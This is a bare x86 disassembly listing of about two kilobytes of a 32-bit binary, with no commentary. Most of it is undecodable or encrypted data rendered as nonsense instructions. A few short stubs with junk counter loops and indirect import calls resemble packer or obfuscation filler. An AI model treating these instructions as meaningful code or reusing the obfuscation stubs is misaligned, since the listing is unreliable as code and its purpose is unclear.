  408158:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408159:	sub    DWORD PTR [eax],edi
  40815b:	or     al,0xf8
  40815d:	sub    ecx,DWORD PTR [ebp-0x20]
  408160:	mul    DWORD PTR [esi+0x19]
  408163:	push   ebx
  408164:	dec    edi
  408165:	js     0x408186
  408167:	jmp    0x9dd5:0xa2cdd33d
  40816e:	(bad)  
  40816f:	xlat   BYTE PTR ds:[ebx]
  408170:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408171:	mov    eax,ds:0x67c52467
  408176:	retf   0x6f63
  408179:	test   eax,0x697aa755
  40817e:	jg     0x40819b
  408180:	daa    
  408181:	sub    esi,DWORD PTR [esi-0x70]
  408184:	rcr    BYTE PTR ds:0x232193e6,cl
  40818a:	fs cmp eax,0x2b678fd9
  408190:	lods   eax,DWORD PTR ds:[esi]
  408191:	inc    ebx
  408192:	pop    ds
  408193:	imul   edx,edx,0xffffffd1
  408196:	lea    esp,[esi+0x7d]
  408199:	mov    esp,0x5eb3dc1e
  40819e:	loopne 0x408147
  4081a0:	retf   
  4081a1:	xchg   ebx,eax
  4081a2:	add    eax,DWORD PTR [ecx]
  4081a4:	adc    BYTE PTR [edi-0x11d9c462],0x73
  4081ab:	stos   BYTE PTR es:[edi],al
  4081ac:	(bad)  
  4081ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4081ae:	jge    0x4081ee
  4081b0:	outs   dx,DWORD PTR ds:[esi]
  4081b2:	scas   al,BYTE PTR es:[edi]
  4081b3:	jp     0x408206
  4081b5:	mov    ch,0xb
  4081b7:	dec    esi
  4081b8:	pop    ecx
  4081b9:	in     al,dx
  4081ba:	jb     0x40819f
  4081bc:	in     al,0xe5
  4081be:	cmp    dl,BYTE PTR [ebx]
  4081c0:	jl     0x408173
  4081c2:	mov    dh,0xfa
  4081c4:	ins    DWORD PTR es:[edi],dx
  4081c5:	fiadd  WORD PTR [ebp+0x12]
  4081c8:	in     al,0x3e
  4081ca:	fnstenv [edi-0x76]
  4081cd:	cli    
  4081ce:	test   eax,0xb079eb26
  4081d3:	push   eax
  4081d4:	shl    BYTE PTR [edx+0x74351343],cl
  4081da:	xchg   edi,eax
  4081db:	pusha  
  4081dc:	xor    BYTE PTR [ecx],dh
  4081de:	(bad)  
  4081df:	lock stc 
  4081e1:	nop
  4081e2:	shl    BYTE PTR [eax+0x19],cl
  4081e5:	gs pop ebp
  4081e7:	xor    BYTE PTR [edi],dl
  4081e9:	test   eax,0x1fda15ee
  4081ee:	std    
  4081ef:	and    DWORD PTR [ebp-0x4c],0xffffffd7
  4081f3:	aas    
  4081f4:	sti    
  4081f5:	jmp    DWORD PTR [edx+0x21179605]
  4081fb:	pop    eax
  4081fc:	adc    BYTE PTR [edx+0x26],bl
  4081ff:	aam    0x49
  408201:	fcmovne st,st(2)
  408203:	pop    es
  408204:	aaa    
  408205:	call   0x7ed5:0x21a0503b
  40820c:	dec    ecx
  40820d:	stos   BYTE PTR es:[edi],al
  40820e:	mov    esp,0xdca4b055
  408213:	aaa    
  408214:	fs jo  0x4081ad
  408217:	sbb    al,cl
  408219:	push   ds
  40821a:	adc    dh,0x3
  40821d:	xchg   ebx,eax
  40821e:	fadd   QWORD PTR fs:[eax]
  408221:	cli    
  408222:	enter  0x1bd9,0x21
  408226:	xchg   esp,eax
  408227:	cmp    bh,al
  408229:	inc    edi
  40822a:	sub    al,0xe0
  40822c:	adc    BYTE PTR [ecx+0x4f],ch
  40822f:	inc    eax
  408230:	inc    esi
  408231:	mov    dl,dl
  408233:	xor    BYTE PTR [esi+edx*4],dl
  408236:	btc    DWORD PTR [ebx+0x2f322685],esi
  40823d:	and    al,0xe5
  40823f:	fbstp  TBYTE PTR [esi]
  408241:	(bad)  
  408242:	cdq    
  408243:	add    BYTE PTR [ebp+0x2f28a00d],ch
  408249:	adc    esi,eax
  40824b:	jecxz  0x4082a9
  40824d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40824e:	xchg   ebp,eax
  40824f:	(bad)  
  408250:	cld    
  408251:	mov    ebx,0xbde228c8
  408256:	aam    0x50
  408258:	stos   BYTE PTR es:[edi],al
  408259:	xchg   edx,eax
  40825a:	mov    ah,0xb4
  40825c:	pop    ecx
  40825d:	aaa    
  40825e:	jns    0x4081f3
  408260:	push   edx
  408261:	push   es
  408262:	call   0x184d:0xa205be75
  408269:	daa    
  40826a:	fisttp QWORD PTR [edx+0x3e]
  40826d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40826e:	call   0xfbc3:0xa7d5d7e1
  408275:	sbb    eax,0x828405a1
  40827a:	xor    al,0x56
  40827c:	adc    ah,BYTE PTR [ebx+0x57e47d85]
  408282:	jmp    0x1f60:0x1b7a329e
  408289:	pop    ebp
  40828a:	adc    al,0xc8
  40828c:	or     eax,esi
  40828e:	and    DWORD PTR [edi-0x3512e01f],edi
  408294:	retf   0x3735
  408297:	clc    
  408298:	popa   
  408299:	xchg   ebx,eax
  40829a:	xchg   edi,eax
  40829b:	cmp    al,0x14
  40829d:	push   es
  40829e:	mov    ds:0x4de9b9f6,al
  4082a3:	push   esp
  4082a4:	imul   ecx,DWORD PTR [edx-0x68d0b40],0x21
  4082ab:	inc    ebp
  4082ac:	inc    ebx
  4082ad:	cmp    ah,BYTE PTR [ecx-0x6a]
  4082b0:	loopne 0x4082e0
  4082b2:	and    al,0x3c
  4082b4:	pop    ebp
  4082b5:	or     al,BYTE PTR [ebp-0x4e]
  4082b8:	mov    ah,0x65
  4082ba:	lods   al,BYTE PTR ds:[esi]
  4082bb:	(bad)  
  4082bc:	cli    
  4082bd:	xlat   BYTE PTR ds:[ebx]
  4082be:	mov    ch,al
  4082c0:	das    
  4082c1:	fdiv   DWORD PTR [ecx]
  4082c3:	and    al,0x4
  4082c5:	out    0x11,al
  4082c7:	sub    BYTE PTR [ebx+0x4b],cl
  4082ca:	popf   
  4082cb:	int3   
  4082cc:	cmp    BYTE PTR [eax],0xba
  4082cf:	xor    al,BYTE PTR [esi+0x7a4382e8]
  4082d5:	es ss inc edx
  4082d8:	or     ebx,DWORD PTR [ebp-0x65]
  4082db:	out    dx,eax
  4082dc:	fisubr WORD PTR [ecx-0x1e]
  4082df:	fiadd  WORD PTR [esi+0x75]
  4082e2:	repz fadd QWORD PTR ds:[ebx+0x3ec9924e]
  4082ea:	pusha  
  4082eb:	jecxz  0x40834e
  4082ed:	sub    eax,0x802f838e
  4082f2:	in     eax,dx
  4082f3:	push   0xe
  4082f5:	jecxz  0x4082a3
  4082f7:	dec    ebp
  4082f8:	sar    BYTE PTR [ebx+0x1ae6ed1],0x82
  4082ff:	imul   ebx,DWORD PTR [ecx],0x4d
  408302:	add    bh,BYTE PTR ds:0x634f575d
  408308:	outs   dx,BYTE PTR ds:[esi]
  408309:	ins    DWORD PTR es:[edi],dx
  40830a:	push   0xffffffc2
  40830c:	mov    eax,ds:0x9e3fd5f4
  408311:	fwait
  408312:	bound  ebx,QWORD PTR [esi+0x3a]
  408315:	pop    es
  408316:	aad    0xbc
  408318:	push   0xf0e93dde
  40831d:	stos   DWORD PTR es:[edi],eax
  40831e:	lock mov ds:0x18589993,eax
  408324:	jp     0x40836b
  408326:	xchg   ecx,eax
  408327:	or     al,0xae
  408329:	add    DWORD PTR [esi-0x487c5e91],eax
  40832f:	mov    bh,0x99
  408331:	fild   WORD PTR [edx+0x22c1e1ec]
  408337:	(bad)  
  408338:	mov    eax,ds:0x16d8f93d
  40833d:	(bad)  
  40833e:	xchg   ecx,eax
  40833f:	not    DWORD PTR [eax-0x395e441a]
  408345:	inc    edx
  408346:	retf   0x5c78
  408349:	mov    esp,0xf571640e
  40834e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40834f:	mov    BYTE PTR [esi+0x70],al
  408352:	jecxz  0x4083aa
  408354:	xor    eax,edx
  408356:	cmp    eax,0x69ca0b32
  40835b:	je     0x4072df
  408361:	mov    eax,DWORD PTR [ebp-0x10]
  408364:	add    DWORD PTR [eax],0x7403504
  40836a:	jmp    0x4072df
  40836f:	mov    eax,DWORD PTR [ebp-0x1c]
  408372:	cmp    DWORD PTR [eax],edi
  408374:	je     0x4072df
  40837a:	mov    eax,0x800f1c81
  40837f:	jmp    0x4072e6
  408384:	push   ebp
  408385:	mov    ebp,esp
  408387:	sub    esp,0x60
  40838a:	mov    DWORD PTR ds:0x4345ef,0x17
  408394:	cmp    DWORD PTR ds:0x4345ef,0x0
  40839b:	je     0x4083fd
  4083a1:	cmp    DWORD PTR ds:0x4345ef,0x6
  4083a8:	jne    0x4083c8
  4083ae:	push   0x434653
  4083b3:	push   0x4c23
  4083b8:	push   0x3f32
  4083bd:	push   0x4c42
  4083c2:	call   DWORD PTR ds:0x413288
  4083c8:	cmp    DWORD PTR ds:0x4345ef,0x7
  4083cf:	jne    0x4083e0
  4083d5:	mov    eax,ds:0x4345ef
  4083da:	dec    eax
  4083db:	mov    ds:0x4345ef,eax
  4083e0:	mov    eax,ds:0x4345ef
  4083e5:	dec    eax
  4083e6:	mov    ds:0x4345ef,eax
  4083eb:	jmp    0x408394
  4083f0:	movzx  eax,BYTE PTR ds:0x434713
  4083f7:	sbb    DWORD PTR ds:0x434603,eax
  4083fd:	mov    eax,DWORD PTR [ebp+0x8]
  408400:	sbb    DWORD PTR ds:0x434687,0x4487
  40840a:	push   ebx
  40840b:	xor    ebx,ebx
  40840d:	or     ebx,DWORD PTR ds:0x434683
  408413:	sbb    DWORD PTR ds:0x434713,ebx
  408419:	push   esi
  40841a:	jmp    0x4086a2
  40841f:	jmp    DWORD PTR [ecx]
  408421:	lahf   
  408422:	xchg   esp,eax
  408423:	mov    eax,ds:0xe73db59c
  408428:	sbb    bh,bl
  40842a:	(bad)  
  40842b:	call   0xfbe15c3c
  408430:	fidivr WORD PTR [esi+0x7e]
  408433:	loope  0x4084ad
  408435:	jle    0x4084b5
  408437:	jne    0x4083c9
  408439:	ins    DWORD PTR es:[edi],dx
  40843a:	int    0x85
  40843c:	push   ss
  40843d:	loop   0x4083c0
  40843f:	xchg   ebp,eax
  408440:	repnz xchg ecx,eax
  408442:	in     eax,dx
  408443:	cmp    dh,BYTE PTR [esi]
  408445:	div    BYTE PTR [edx+0x26]
  408448:	mov    BYTE PTR [ebx],0x23
  40844b:	cmp    esi,DWORD PTR [ebx]
  40844d:	push   ebx
  40844e:	in     eax,dx
  40844f:	push   cs
  408450:	fisttp DWORD PTR [ebp+0x74d35ef0]
  408456:	jle    0x408445
  408458:	jne    0x4084d0
  40845a:	or     ebx,DWORD PTR [edx]
  40845c:	xor    eax,0x4c037a28
  408461:	and    DWORD PTR [edx+eiz*1-0x13],esi
  408465:	sub    al,0xa2
  408467:	mov    ds:0x6c8d70bb,al
  40846c:	cmp    al,0xeb
  40846e:	push   edx
  40846f:	inc    ecx
  408470:	mov    ecx,0x8e414f47
  408475:	sub    al,al
  408477:	addr16 xor eax,0x29c8bad0
  40847d:	jb     0x40845b
  40847f:	push   ds
  408480:	pop    esp
  408481:	or     BYTE PTR [ebx],dh
  408483:	or     al,0xc2
  408485:	fdiv   QWORD PTR [esi]
  408487:	leave  
  408488:	sub    edx,0x740bd956
  40848e:	add    al,0xd3
  408490:	aam    0xe4
  408492:	inc    esi
  408493:	sub    al,0xaf
  408495:	or     edx,DWORD PTR [ecx]
  408497:	repnz sub cl,BYTE PTR [ebx-0x7410a556]
  40849e:	inc    edx
  40849f:	mov    DWORD PTR [ebp-0x37],esp
  4084a2:	inc    edi
  4084a3:	stos   DWORD PTR es:[edi],eax
  4084a4:	ret    0xec84
  4084a7:	sub    al,BYTE PTR [ecx+ebx*8]
  4084aa:	push   ecx
  4084ab:	test   al,0xb9
  4084ad:	mov    ?,WORD PTR [edi+ebx*8-0x1e]
  4084b1:	jnp    0x4084d8
  4084b3:	fld    TBYTE PTR [edi]
  4084b5:	ret    
  4084b6:	inc    esp
  4084b7:	ja     0x40852c
  4084b9:	adc    eax,0x1fa6c0d2
  4084be:	push   0x4841a3fa
  4084c3:	mov    edx,0x872ec01b
  4084c8:	test   eax,0x538f7a11
  4084cd:	nop
  4084ce:	leave  
  4084cf:	lahf   
  4084d0:	ins    BYTE PTR es:[edi],dx
  4084d1:	js     0x4084ae
  4084d3:	jbe    0x40854f
  4084d5:	bound  ecx,QWORD PTR [esi]
  4084d7:	mov    BYTE PTR [esp+ebx*1],al
  4084da:	shl    BYTE PTR [ebx+0x2b452a36],cl
  4084e0:	repnz loop 0x408555
  4084e3:	push   es
  4084e4:	stos   BYTE PTR es:[edi],al
  4084e5:	dec    DWORD PTR [edi+0x5a614356]
  4084eb:	mov    edi,0xd42c4371
  4084f0:	xor    ecx,DWORD PTR [ecx+0x69]
  4084f3:	xchg   esi,eax
  4084f4:	and    DWORD PTR [ecx-0x28c52344],ebx
  4084fa:	push   ss
  4084fb:	jecxz  0x4084b5
  4084fd:	adc    bl,BYTE PTR [eax-0x13aa95d6]
  408503:	test   BYTE PTR [eax+ebx*1+0x71],ah
  408507:	packssdw mm2,mm6
  40850a:	scas   eax,DWORD PTR es:[edi]
  40850b:	jo     0x4084aa
  40850d:	retf   0x83b8
  408510:	lea    eax,[ecx+eiz*8-0x7e0a00ef]
  408517:	outs   dx,DWORD PTR ds:[esi]
  408518:	test   BYTE PTR [esi],al
  40851a:	std    
  40851b:	sub    al,0x98
  40851d:	shl    DWORD PTR [eax],cl
  40851f:	cdq    
  408520:	xor    al,0x90
  408522:	or     BYTE PTR [esi+0x3ceef93],dl
  408528:	xor    al,dh
  40852a:	pop    ebp
  40852b:	mov    esp,0x9e8ab10e
  408530:	dec    esp
  408531:	pop    ds
  408532:	inc    edi
  408533:	ret    0xaaa0
  408536:	call   0xef9b6c09
  40853b:	ins    BYTE PTR es:[edi],dx
  40853c:	push   edi
  40853d:	mov    eax,ds:0xdd292675
  408542:	jle    0x408500
  408544:	jbe    0x40852f
  408546:	push   ecx
  408547:	(bad)  
  408548:	fcomip st,st(7)
  40854a:	adc    eax,0x6bc097fa
  40854f:	pop    edi
  408550:	fs cmp dh,al
  408553:	or     DWORD PTR [eax+0x72491b92],0x5d3213e9
  40855d:	dec    esi
  40855e:	test   bh,0x55
  408561:	imul   edi,DWORD PTR [eax+0x1f],0x2
  408565:	pop    edx
  408566:	out    dx,eax
  408567:	mov    bh,0xce
  408569:	pop    esp
  40856a:	scas   eax,DWORD PTR es:[edi]
  40856b:	xor    BYTE PTR [ecx+esi*1],ch
  40856e:	mov    esp,0xd541d14d
  408573:	pop    ecx
  408574:	(bad)  
  408575:	xchg   ebp,eax
  408576:	scas   eax,DWORD PTR es:[edi]
  408577:	sub    DWORD PTR [eax+eax*2+0x36],0x36
  40857c:	outs   dx,DWORD PTR ds:[esi]
  40857d:	cmc    
  40857e:	push   0x8b7a95f3
  408583:	cdq    
  408584:	mov    eax,0x95db4abd
  408589:	mov    eax,ds:0x5a09abb
  40858e:	stc    
  40858f:	fwait
  408590:	inc    esp
  408591:	ins    DWORD PTR es:[edi],dx
  408592:	int    0xdc
  408594:	rcr    BYTE PTR [esi+0x6fe72283],1
  40859a:	nop
  40859b:	mov    cl,0xbe
  40859d:	in     al,0x8f
  40859f:	inc    esp
  4085a0:	xor    bh,ah
  4085a2:	ins    DWORD PTR es:[edi],dx
  4085a3:	mov    ecx,0xcff0db48
  4085a8:	mov    al,ds:0x9f07401b
  4085ad:	or     ebx,DWORD PTR [eax+ebx*8]
  4085b0:	imul   ebx,esp,0x7b
  4085b3:	int    0xdb
  4085b5:	and    DWORD PTR [esi],ecx
  4085b7:	out    dx,al
  4085b8:	mov    al,0x9d
  4085ba:	jmp    0xbb6e601
  4085bf:	ins    DWORD PTR es:[edi],dx
  4085c0:	or     DWORD PTR [ecx],esi
  4085c2:	es sbb eax,0x4b3de28
  4085c8:	mov    edx,0xbf112017
  4085cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4085ce:	je     0x408626
  4085d0:	xor    ebx,DWORD PTR [ecx-0x18]
  4085d3:	mov    al,ds:0x5d3ea18c
  4085d8:	inc    ebp
  4085d9:	add    al,0x62
  4085db:	jmp    0x33db:0xbd2cba4c
  4085e2:	or     eax,0x94dc14b4
  4085e7:	jmp    0x5bd9:0x5f49d3d4
  4085ee:	jno    0x40858b
  4085f0:	pushf  
  4085f1:	dec    ebx
  4085f2:	mov    edx,0x1a1126a8
  4085f7:	sahf   
  4085f8:	lods   eax,DWORD PTR ds:[esi]
  4085f9:	aam    0x8
  4085fb:	loopne 0x4085dd
  4085fd:	adc    esi,DWORD PTR [ebx+0x5f957b6]
  408603:	inc    ebp
  408604:	sbb    BYTE PTR [esp+ebp*8],bl
  408607:	aam    0x91
  408609:	jl     0x4085fb
  40860b:	push   edx
  40860c:	inc    ebp
  40860d:	dec    ebp
  40860e:	add    DWORD PTR [ebp-0x3c96837],ecx
  408614:	ins    DWORD PTR es:[edi],dx
  408615:	arpl   di,bp
  408617:	out    0x9e,al
  408619:	xchg   ecx,eax
  40861a:	test   eax,0xd992685a
  40861f:	add    BYTE PTR [ecx+edi*8],0x26
  408623:	bswap  eax
  408625:	pop    esp
  408626:	sbb    eax,0x32b3637
  40862b:	xchg   ebx,eax
  40862c:	test   eax,0xd77b44ce
  408631:	pop    ecx
  408632:	pop    ebp
  408633:	or     DWORD PTR [esi],edx
  408635:	push   0xffffff90
  408637:	shr    DWORD PTR [ebx-0x3bcabc25],1
  40863d:	sub    BYTE PTR es:[edx-0x58],dl
  408641:	dec    esi
  408642:	xlat   BYTE PTR ds:[ebx]
  408643:	addr16 mov esi,0x28e1f015
  408649:	ja     0x40869f
  40864b:	aas    
  40864c:	into   
  40864d:	and    BYTE PTR [edx+eiz*2+0x25],al
  408651:	sti    
  408652:	jmp    0x4085d9
  408654:	mov    WORD PTR [esi+eax*8+0x743f6f50],?
  40865b:	sbb    DWORD PTR [eax+ecx*8+0x59],edi
  40865f:	dec    edi
  408660:	sub    bh,BYTE PTR [edi+0x72]
  408663:	ins    DWORD PTR es:[edi],dx
  408664:	sahf   
  408665:	inc    edx
  408666:	ss imul esi,esi,0x4e654e48
  40866d:	jge    0x408675
  40866f:	adc    eax,0x3e97e71a
  408674:	int    0x1d
  408676:	pop    ds
  408677:	in     al,dx
  408678:	xchg   esi,eax
  408679:	aas    
  40867a:	mov    cl,0xa2
  40867c:	out    dx,eax
  40867d:	mov    edi,0xa7af91f6
  408682:	(bad)  [esi+eiz*8+0xd]
  408686:	ficomp DWORD PTR [ebp+0x1b956b5e]
  40868c:	enter  0xaf9,0x74
  408690:	push   ss
  408691:	aas    
  408692:	and    cl,BYTE PTR [esi+0x31]
  408695:	je     0x40870e
  408697:	ror    DWORD PTR [eax+0x79],cl
  40869a:	xor    DWORD PTR [eax+0x1b29e081],edi
  4086a0:	shl    BYTE PTR [ebp+0x510851be],1
  4086a6:	pop    es
  4086a7:	and    DWORD PTR ds:0x4345ef,0x0
  4086b1:	mov    ebx,DWORD PTR ds:0x4345ef
  4086b7:	inc    ebx
  4086b8:	mov    DWORD PTR ds:0x4345ef,ebx
  4086be:	cmp    DWORD PTR ds:0x4345ef,0x8
  4086c5:	jne    0x4086d6
  4086cb:	push   0x2214
  4086d0:	call   DWORD PTR ds:0x41328c
  4086d6:	cmp    DWORD PTR ds:0x4345ef,0x7
  4086dd:	jne    0x4086f2
  4086e3:	xor    ebx,ebx
  4086e5:	or     ebx,DWORD PTR ds:0x4345ef
  4086eb:	inc    ebx
  4086ec:	mov    DWORD PTR ds:0x4345ef,ebx
  4086f2:	cmp    DWORD PTR ds:0x4345ef,0x11
  4086f9:	jb     0x4086b1
  4086ff:	xor    eax,esi
  408701:	or     ebx,0x4275
  408707:	mov    ebx,0x327299
  40870c:	add    eax,ebx
  40870e:	push   edi
  40870f:	sub    edi,DWORD PTR ds:0x434683
  408715:	mov    DWORD PTR [ebp-0x18],eax
  408718:	xor    edi,0x561f
  40871e:	jmp    0x4089a6
  408723:	push   esi
  408724:	ja     0x40875d
  408726:	push   ecx
  408727:	aaa    
  408728:	push   ecx
  408729:	jo     0x40879c
  40872b:	(bad)  
  40872c:	mov    eax,0x39233fc8
  408731:	adc    DWORD PTR [ebp+0x6e],ebx
  408734:	fdivr  DWORD PTR [esi+0x7e]
  408737:	loope  0x4087b1
  408739:	jle    0x4087b9
  40873b:	fstp   DWORD PTR [edx-0xd]
  40873e:	add    eax,0x3994790e
  408743:	sub    dl,BYTE PTR [ebx-0x3d]
  408746:	push   esi
  408747:	jmp    0x4308ab12
  40874c:	arpl   WORD PTR [edi],sp
  40874e:	adc    BYTE PTR [ecx+0x22],0xd8
  408752:	retf   0xcf90
  408755:	jno    0x40875a
  408757:	call   0x5701:0xe24fdfbf
  40875e:	cmp    al,0xd8
  408760:	xlat   BYTE PTR ds:[ebx]
  408761:	imul   ebp,DWORD PTR [edx+ecx*2],0x75
  408765:	rcr    DWORD PTR ds:0x75d7a441,0x82
  40876c:	push   0x57ae8703
  408771:	call   0xc648396a
  408776:	add    dh,BYTE PTR [edx+esi*8]
  408779:	int3   
  40877a:	mov    edi,0xdb4a3feb
  40877f:	gs push edx
  408781:	clc    
  408782:	dec    edx
  408783:	jmp    0x4087ac
  408785:	mov    gs,ebp
  408787:	inc    eax
  408788:	imul   eax,edi,0xfffffff3
  40878b:	jge    0x4087da
  40878d:	dec    ebx
  40878e:	loop   0x4087c7
  408790:	cdq    
  408791:	les    esi,FWORD PTR [edi+0xb]
  408794:	ret    
  408795:	mov    ebx,DWORD PTR [edx+ebx*8+0x1b]
  408799:	mov    ecx,DWORD PTR [ebx+eiz*1-0x640dbcdf]
  4087a0:	bound  esp,QWORD PTR [edi]
  4087a2:	mov    dl,0x4c
  4087a4:	sbb    eax,0xa390a08d
  4087a9:	repnz and BYTE PTR [esi-0x2a],0xfd
  4087ae:	loop   0x40873c
  4087b0:	sub    al,0x8c
  4087b2:	mov    bl,0x27
  4087b4:	xchg   DWORD PTR [esi-0x3acdbb70],ebp
  4087ba:	add    edi,ebx
  4087bc:	popf   
  4087bd:	cmp    BYTE PTR ds:[esi+edx*8],dh
  4087c1:	adc    al,0xf5
  4087c3:	addr16 mov dl,0x2
  4087c6:	cwde   
  4087c7:	mov    ebp,0x4b9e837d
  4087cc:	xchg   edx,eax
  4087cd:	jle    0x40879d
  4087cf:	fbstp  TBYTE PTR [esi+0x6ae98f86]
  4087d5:	in     al,0x3d
  4087d7:	fisub  WORD PTR [esi+eiz*4-0x5c973485]
  4087de:	xchg   ebp,eax
  4087df:	and    DWORD PTR [edi],esp
  4087e1:	stc    
  4087e2:	in     eax,dx
  4087e3:	ss in  al,dx
  4087e5:	mov    eax,ds:0x8d367911
  4087ea:	push   cs
  4087eb:	ds out dx,eax
  4087ed:	pop    esp
  4087ee:	aas    
  4087ef:	adc    eax,0x86ffbe7c
  4087f4:	repnz repnz pusha 
  4087f7:	ss in  al,dx
  4087f9:	(bad)  
  4087fa:	mov    al,ds:0x721302e1
  4087ff:	push   esi
  408800:	aas    
  408801:	fwait
  408802:	dec    esp
  408803:	sbb    eax,DWORD PTR [ecx-0x76]
  408806:	aam    0x1d
  408808:	lock pop es
  40880a:	jbe    0x408877
  40880c:	sbb    edi,DWORD PTR [eax]
  40880e:	push   esi
  40880f:	jbe    0x40882f
  408811:	fcmovu st,st(5)
  408813:	cmp    ecx,esi
  408815:	jg     0x4087c3
  408817:	push   esi
  408818:	jns    0x40882f
  40881a:	cwde   
  40881b:	sti    
  40881c:	into   
  40881d:	pop    edx
  40881e:	push   edi
  40881f:	rol    dh,cl
  408821:	mov    ebx,0xc47de308
  408826:	movhlps xmm5,xmm5
  408829:	dec    edi
  40882a:	or     DWORD PTR [ecx],esp
  40882c:	jb     0x40886e
  40882e:	inc    ebp
  40882f:	cmp    al,0x18
  408831:	jecxz  0x4087f0
  408833:	into   
  408834:	pop    edx
  408835:	add    BYTE PTR [esi-0x19b33a4a],ch
  40883b:	aad    0x14
  40883d:	mov    bh,0xf9
  40883f:	jge    0x40886e
  408841:	sbb    ah,dl
  408843:	dec    esi
  408844:	call   FWORD PTR [ebx+0x5c]
  408847:	adc    eax,0x92e2f9db
  40884c:	fcmovu st,st(2)
  40884e:	std    
  40884f:	jp     0x4088c6
  408851:	js     0x4088be
  408853:	jl     0x408856
  408855:	imul   ebx,esp,0xe21b1734
  40885b:	and    eax,0x7996b006
  408860:	loope  0x408837
  408862:	jp     0x408857
  408864:	nop
  408865:	or     al,BYTE PTR [edi+ebp*2+0x4b]
  408869:	jl     0x4088ba
  40886b:	xor    eax,ebp
  40886d:	jae    0x408809
  40886f:	retf   0xd4a1
  408872:	shl    DWORD PTR [ecx+ebp*4-0x70d8e0c7],1
  408879:	mov    eax,0x7caf6f01
  40887e:	dec    ebp
  40887f:	lahf   
  408880:	mov    dl,0x47
  408882:	popf   
  408883:	call   0x39d7:0x178a4248
  40888a:	mov    edx,0x801b9b60
  40888f:	jg     0x408834
  408891:	jecxz  0x408885
  408893:	jp     0x4088e7
  408895:	stos   BYTE PTR es:[edi],al
  408896:	iret   
  408897:	ret    
  408898:	fstp   QWORD PTR [edi]
  40889a:	popf   
  40889b:	adc    eax,0xb09cca81
  4088a0:	sbb    DWORD PTR [esi+0x6e707b38],edx
  4088a6:	ins    BYTE PTR es:[edi],dx
  4088a7:	mov    ecx,0xa28a4449
  4088ac:	loope  0x408847
  4088ae:	loope  0x40891a
  4088b0:	jmp    0xde99:0x1e7e6b1d
  4088b7:	jno    0x4088e5
  4088b9:	imul   eax,DWORD PTR [edx],0xd3b3ec75
  4088bf:	repnz inc eax
  4088c1:	xor    cl,BYTE PTR [ecx]
  4088c3:	pusha  
  4088c4:	mov    DWORD PTR [esi+ebp*8],0x60ddf41b
  4088cb:	addr16 pusha 
  4088cd:	jg     0x40888c
  4088cf:	or     BYTE PTR [ecx-0x57],dh
  4088d2:	rcr    DWORD PTR [ecx],1
  4088d4:	and    al,al
  4088d6:	mov    ds:0xf777080f,al
  4088db:	shr    BYTE PTR [ecx+0xa],0x1b
  4088df:	adc    al,0x25
  4088e1:	and    edx,DWORD PTR [ecx+0x73]
  4088e4:	in     al,dx
  4088e5:	jo     0x4088e8
  4088e7:	(bad)  
  4088e8:	fmulp  st(1),st
  4088ea:	into   
  4088eb:	addr16 sub eax,0xd9e706f
  4088f1:	fimul  DWORD PTR [edi+0x65f324d1]
  4088f7:	ins    DWORD PTR es:[edi],dx
  4088f8:	retf   
  4088f9:	mov    ecx,0xa0ce2c8f
  4088fe:	or     BYTE PTR [eax-0x45],0x61
  408902:	dec    esi
  408903:	nop
  408904:	xor    bh,BYTE PTR [ebx*4+0x32382b6e]
  40890b:	inc    ebx
  40890c:	or     BYTE PTR [ebp+0x537c8a64],0xb9
  408913:	out    0xf0,eax
  408915:	xor    eax,0x3adfffdd
  40891a:	dec    edi
  40891b:	dec    edi
  40891c:	scas   al,BYTE PTR es:[edi]
  40891d:	add    ecx,DWORD PTR [edi+0x68]
  408920:	ror    DWORD PTR [ecx-0x12b20b0d],0xe5
  408927:	pop    ss
  408928:	pop    edi
  408929:	mov    ebp,0x3691d32e
  40892e:	mov    esi,0x19db7c67
  408933:	repz aas 
  408935:	pop    eax
  408936:	inc    ecx
  408937:	and    BYTE PTR [edi+0x4b38b667],ch
  40893d:	shr    DWORD PTR [edi+0x779a0318],0x7d
  408944:	and    bh,BYTE PTR [esi+0x70]
  408947:	sub    al,0x90
  408949:	lods   eax,DWORD PTR ds:[esi]
  40894a:	and    eax,0xa52b3c0a
  40894f:	sbb    DWORD PTR [ebx-0x1d],esi
  408952:	ja     0x40898a
  408954:	loope  0x408963
  408956:	ret    0x9963
  408959:	cli    
  40895a:	lods   al,BYTE PTR ds:[esi]
  40895b:	adc    BYTE PTR [edx-0x39b22502],0x24
  408962:	rcl    BYTE PTR es:[edx-0x38cec2a7],1
  408969:	mov    eax,ds:0xce709919
  40896e:	mov    dl,0xe6
  408970:	or     BYTE PTR ds:0xf861bfda,bl
  408976:	lods   eax,DWORD PTR ds:[esi]
  408977:	ror    edi,cl
  408979:	add    edi,DWORD PTR [edi+0x30bbdd0a]
  40897f:	test   al,0x35
  408981:	xchg   edi,eax
  408982:	fisubr WORD PTR [ebx]
  408984:	imul   ebp,DWORD PTR [ebx],0xed55cba1
  40898a:	mov    ecx,0xc0e9d61a
  40898f:	mov    eax,0x9826e35f
  408994:	or     BYTE PTR [ebx+0xedd0e2c],dl
  40899a:	(bad)  
  40899b:	icebp  
  40899c:	jnp    0x40894f
  40899e:	sar    DWORD PTR gs:0x42942a6d,cl
  4089a5:	imul   ecx,DWORD PTR [ebx-0x1ccf783],0x45eb15f7
  4089af:	inc    ebx
  4089b0:	add    bh,al
  4089b2:	inc    ebp
  4089b3:	hlt    
  4089b4:	test   BYTE PTR [ebp+0x45c7f89c],0xf0
  4089bb:	xchg   DWORD PTR ss:[eax+edi*8+0x7e9fb03],ebx
  4089c3:	or     DWORD PTR [eax],eax
  4089c5:	add    BYTE PTR [ebx-0x7c16c001],al
  4089cb:	add    al,BYTE PTR [eax]
  4089cd:	add    BYTE PTR [edx],dl
  4089cf:	xchg   ebx,eax
  4089d0:	xor    eax,0x1cadb523
  4089d5:	mov    bl,0x93
  4089d7:	pop    ds
  4089d8:	adc    cl,cl
  4089da:	and    bh,ch
  4089dc:	jl     0x408972
  4089de:	rcr    ebx,1
  4089e0:	jle    0x408a60
  4089e2:	loope  0x408a5c
  4089e4:	jle    0x408a64
  4089e6:	fldcw  WORD PTR [eax+0x39f6b14f]
  4089ec:	stos   DWORD PTR es:[edi],eax
  4089ed:	stc    
